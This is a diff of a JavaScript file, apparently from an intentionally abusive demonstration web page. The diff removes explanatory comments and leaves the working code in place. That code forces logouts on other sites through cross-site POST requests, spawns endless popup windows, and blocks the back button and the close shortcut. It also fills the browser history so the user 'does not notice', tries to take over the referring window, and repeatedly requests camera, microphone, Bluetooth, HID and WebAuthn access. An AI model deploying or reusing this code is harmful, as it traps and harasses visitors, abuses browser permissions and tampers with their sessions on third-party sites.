@@ -133,52 +133,24 @@ const LOGOUT_SITES = {
   YouTube: ['POST', 'https://www.youtube.com', { action_logout: '1' }]
 }
 
-/**
- * Array to store the child windows spawned by this window.
- */
+
 const wins = []
 
-/**
- * Count of number of clicks
- */
 let interactionCount = 0
 
-/**
- * Number of iframes injected into the page for the "super logout" functionality.
- * See superLogout().
- */
 let numSuperLogoutIframes = 0
 
-/**
- * Is this window a child window? A window is a child window if there exists a
- * parent window (i.e. the window was opened by another window so `window.opener`
- * is set) *AND* that parent is a window on the same origin (i.e. the window was
- * opened by us, not an external website)
- */
 const isChildWindow = (window.opener && isParentSameOrigin()) ||
   window.location.search.indexOf('child=true') !== -1
 
-/**
- * Is this window a parent window?
- */
 const isParentWindow = !isChildWindow
 
-/*
- * Run this code in all windows, *both* child and parent windows.
- */
 init()
 
-/*
- * Use `window.opener` to detect if this window was opened by another window, which
- * will be its parent. The `window.opener` variable is a reference to the parent
- * window.
- */
+
 if (isChildWindow) initChildWindow()
 else initParentWindow()
 
-/**
- * Initialization code for *both* parent and child windows.
- */
 function init () {
   confirmPageUnload()
 
@@ -189,9 +161,6 @@ function init () {
     event.preventDefault()
     event.stopPropagation()
 
-    // 'touchstart' and 'touchend' events are not able to open a new window
-    // (at least in Chrome), so don't even try. Checking `event.which !== 0` is just
-    // a clever way to exclude touch events.
     if (event.which !== 0) openWindow()
 
     startVibrateInterval()
@@ -203,8 +172,6 @@ function init () {
     speak()
     startTheramin()
 
-    // Capture key presses on the Command or Control keys, to interfere with the
-    // "Close Window" shortcut.
     if (event.key === 'Meta' || event.key === 'Control') {
       window.print()
       requestWebauthnAttestation()
@@ -224,8 +191,7 @@ function init () {
       requestHidAccess()
       requestCameraAndMic()
       if (Math.random() < 0.1) {
-        // Don't request TouchID on every interaction in Safari since it blocks
-        // the event loop and stops windows from moving
+     
         requestWebauthnAttestation()
       }
     }
@@ -254,9 +220,7 @@ function initChildWindow () {
   })
 }
 
-/**
- * Initialization code for parent windows.
- */
+
 function initParentWindow () {
   showHelloMessage()
   blockBackButton()
@@ -264,7 +228,7 @@ function initParentWindow () {
   startInvisiblePictureInPictureVideo()
 
   interceptUserInput(event => {
-    // Only run these on the first interaction
+   
     if (interactionCount === 1) {
       registerProtocolHandlers()
       attemptToTakeoverReferrerWindow()
@@ -338,7 +302,7 @@ function requestCameraAndMic () {
       const imageCapture = new window.ImageCapture(track)
 
       imageCapture.getPhotoCapabilities().then(() => {
-        // Let there be light!
+      
         track.applyConstraints({ advanced: [{ torch: true }] })
       }, () => { /* No torch on this device */ })
     }, () => { /* ignore errors */ })
@@ -347,7 +311,7 @@ function requestCameraAndMic () {
 
 function animateUrlWithEmojis () {
   if (window.ApplePaySession) {
-    // Safari doesn't show the full URL anyway, so we can't animate it
+
     return
   }
   const rand = Math.random()
@@ -441,10 +405,7 @@ function requestPointerLock () {
   requestPointerLockApi.call(document.body)
 }
 
-/**
- * Start vibrating the device at random intervals, on supported devices.
- * Requires user-initiated event.
- */
+
 function startVibrateInterval () {
   if (typeof window.navigator.vibrate !== 'function') return
   setInterval(() => {
@@ -452,7 +413,7 @@ function startVibrateInterval () {
     window.navigator.vibrate(duration)
   }, 1000)
 
-  // If the gamepad can vibrate, we will at random intervals every second. And at random strengths!
+ 
   window.addEventListener('gamepadconnected', (event) => {
     const gamepad = event.gamepad
     if (gamepad.vibrationActuator) {
@@ -519,7 +480,7 @@ function openWindow () {
   const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
   const win = window.open(window.location.pathname, '', opts)
 
-  // New windows may be blocked by the popup blocker
+  
   if (!win) return
   wins.push(win)
 
@@ -666,8 +627,7 @@ function requestMidiAccess () {
 function requestBluetoothAccess () {
   try {
     navigator.bluetooth.requestDevice({
-      // filters: [...] <- Prefer filters to save energy & show relevant devices.
-      // acceptAllDevices here ensures dialog can populate, we don't care with what.
+     
       acceptAllDevices: true
     })
       .then(device => device.gatt.connect())
@@ -931,7 +891,7 @@ function fillHistory () {
   for (let i = 1; i < 20; i++) {
     window.history.pushState({}, '', window.location.pathname + '?q=' + i)
   }
-  // Set location back to the initial location, so user does not notice
+  
   window.history.pushState({}, '', window.location.pathname)
 }
 
@@ -991,10 +951,8 @@ function detectBrowser () {
   } else if (/edga\//i.test(userAgent)) {
     return 'edge'
   } else if (/opt\//i.test(userAgent)) {
-    // Opera iOS
     return 'opera'
   } else if (/opr\//i.test(userAgent)) {
-    // Opera Android
     return 'opera'
   } else if (/chrome\//i.test(userAgent)) {
     return 'chrome'
